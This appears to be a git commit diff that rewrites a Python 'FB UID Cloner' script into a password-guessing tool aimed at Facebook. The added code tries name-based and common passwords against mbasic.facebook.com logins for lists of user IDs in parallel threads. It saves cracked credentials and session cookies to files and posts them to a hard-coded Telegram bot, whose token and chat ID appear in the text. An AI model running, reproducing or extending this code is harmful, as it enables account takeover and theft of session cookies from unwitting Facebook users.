9edaa71ca6f2eb3995293d9b74665820f4bfc141
Forhad <165383823+Forhadj@users.noreply.github.com>
2025-06-28 18:23:17 +0600

    Update app.py

--- app.py
+++ app.py
@@ -1,106 +1,145 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
+import os, sys, time, random, mechanize, requests
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup
 
-import os, zlib
-from os import system as osRUB
-from os import system as cmd
-os.system('clear')
-print('loading Modules ...\n')
+# Telegram Config
+bot_token = "7916067646:AAHLwaaZrzgVeqrV3oLXJnSTCa8xOfizzQU"
+chat_id = "5672808863"
 
-try:
-    import requests 
-except ImportError:
-    print('\n  installing Requests ...\n')
-    os.system('pip install requests')
+# Files
+ok_file = "OK.txt"
+cp_file = "CP.txt"
+cookie_file = "OK-cookie.txt"
 
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n  installing futures ...\n')
-    os.system('pip install futures')
+# User-Agent List
+user_agents = [
+    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
+]
 
-try:
-    import mechanize
-except ModuleNotFoundError:
-    os.system('pip install mechanize > /dev/null')
+# Mechanize Setup
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_equiv(True)
+br.set_handle_redirect(True)
+br.set_handle_referer(True)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [("User-Agent", random.choice(user_agents))]
 
-from urllib.request import Request, urlopen
-import random, platform, sys, subprocess, threading, itertools, base64, uuid, re, json, shutil, webbrowser, time, datetime, string
-from concurrent.futures import ThreadPoolExecutor as sarfrazssb
-from string import *
-from random import randint
-from time import sleep as slp
-from zlib import decompress 
-
-model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
-
-totaldmp = 0
-count = 0
-loop = 0
 oks = []
 cps = []
-id = []
-ps = []
-sid = []
-total = []
-methods = []
-srange = 0
-saved = []
-filter = []
 
-def randBuildLSB():
-    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-    VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
-    return ua
+def telegram_alert(msg):
+    try:
+        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data={
+            "chat_id": chat_id,
+            "text": msg
+        })
+    except:
+        pass
 
-def randBuildvsskj():
-    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
-    return ua
-
-S = '\033[1;37m'
-A = '\x1b[38;5;208m'
-R = '\x1b[38;5;46m'
-F = '\x1b[38;5;48m'
-Z = '\033[1;33m'
-
-logo = """ 
+def banner():
+    os.system("clear")
+    print(f"""
+\033[1;32m
   ______         _               _  
  |  ____|       | |             | | 
  | |__ ___  _ __| |__   __ _  __| | 
- |  __/ _ \| '__| '_ \ / _` |/ _` | 
+ |  __/ _ \\| '__| '_ \\ / _` |/ _` | 
  | | | (_) | |  | | | | (_| | (_| | 
- |_|  \___/|_|  |_| |_|\__,_|\__,_| 
-                                    
-                                    
+ |_|  \\___/|_|  |_| |_|\\__,_|\\__,_| 
+
 \033[1;37m------------------------------------------------
-\033[1;37m Owner   :              Forhad Hasan
-\033[1;37m Facebook:           Forhad Hasan 
-\033[1;37m Github  :               Forhadj
-\033[1;37m Version :            19.8
+\033[1;36m Owner   : Forhad Hasan
+ Github   : https://github.com/Forhadj
+ Tool     : FB UID Cloner (Real)
+ Version  : 1.0
 \033[1;37m------------------------------------------------
-"""
+""")
 
-def clear():
-    os.system("clear")
-    print(logo)    
+def login(uid, name, pwx):
+    global oks, cps
+    sys.stdout.write(f"\r[•] Cracking {uid}... OK: {len(oks)} CP: {len(cps)}")
+    sys.stdout.flush()
+    for pw in pwx:
+        try:
+            session = requests.Session()
+            session.headers.update({"User-Agent": random.choice(user_agents)})
+            res = session.get("https://mbasic.facebook.com")
+            bs = BeautifulSoup(res.text, "html.parser")
+            lsd = bs.find("input", {"name":"lsd"}).get("value")
+            jazoest = bs.find("input", {"name":"jazoest"}).get("value")
+            data = {
+                "lsd": lsd,
+                "jazoest": jazoest,
+                "email": uid,
+                "pass": pw,
+                "login": "Log In"
+            }
+            response = session.post("https://mbasic.facebook.com/login.php", data=data, allow_redirects=True)
+            if "c_user" in session.cookies.get_dict():
+                cookie = "; ".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
+                msg = f"🔥 OK: {uid} | {pw}\n🍪 Cookie: {cookie}"
+                print(f"\n\033[1;32m[OK] {uid} | {pw}")
+                with open(ok_file, "a") as okf: okf.write(f"{uid}|{pw}\n")
+                with open(cookie_file, "a") as cf: cf.write(f"{uid}|{pw}|{cookie}\n")
+                telegram_alert(msg)
+                oks.append(uid)
+                break
+            elif "checkpoint" in session.cookies.get_dict():
+                print(f"\n\033[1;33m[CP] {uid} | {pw}")
+                with open(cp_file, "a") as cpf: cpf.write(f"{uid}|{pw}\n")
+                telegram_alert(f"⚠️ CP: {uid} | {pw}")
+                cps.append(uid)
+                break
+        except:
+            pass
 
-def result(OKs, cps):
-    if len(OKs) != 0 or len(cps) != 0:
-        print('\n')
-        print(47*'-')
-        print(' The Process has been Complete...')
-        print(' TOTAL OK: %s' % str(len(oks)))
-        print(' TOTAL CP: %s' % str(len(cps)))
-        print(47*'-')
-        input("Press enter to back SSB Menu ")
-        exit()
+def start_crack():
+    banner()
+    file = input("[•] Enter UID file name (e.g. ids.txt): ")
+    try:
+        uid_list = open(file).read().splitlines()
+    except FileNotFoundError:
+        print("[!] File not found")
+        return
 
-# ... [Rest of the code remains the same with proper indentation and fixes] ...
+    pw_input = input("[•] Enter passwords (comma separated or leave empty for auto): ")
+    print(f"[✓] Total IDs loaded: {len(uid_list)}")
+    print("[✓] Cracking started...\n")
 
-def main():
-    sarfraz()
+    with ThreadPoolExecutor(max_workers=20) as ex:
+        for line in uid_list:
+            try:
+                uid, name = line.split("|")
+                name = name.lower()
+                if pw_input:
+                    pwx = [x.strip() for x in pw_input.split(",")]
+                else:
+                    pwx = [name+"123", name+"1234", "123456", "bangladesh", name+"2024"]
+                ex.submit(login, uid, name, pwx)
+            except:
+                continue
+
+    print("\n[✓] Process complete")
+    print(f"[✓] Total OK: {len(oks)}")
+    print(f"[✓] Total CP: {len(cps)}")
+    input("[•] Press Enter to return to menu...")
+
+def menu():
+    while True:
+        banner()
+        print("[1] Start Cloning")
+        print("[0] Exit")
+        ch = input("\n[•] Choose: ")
+        if ch == "1":
+            start_crack()
+        elif ch == "0":
+            exit()
+        else:
+            print("[!] Invalid option")
+            time.sleep(1)
 
 if __name__ == "__main__":
-    main()
+    menu()
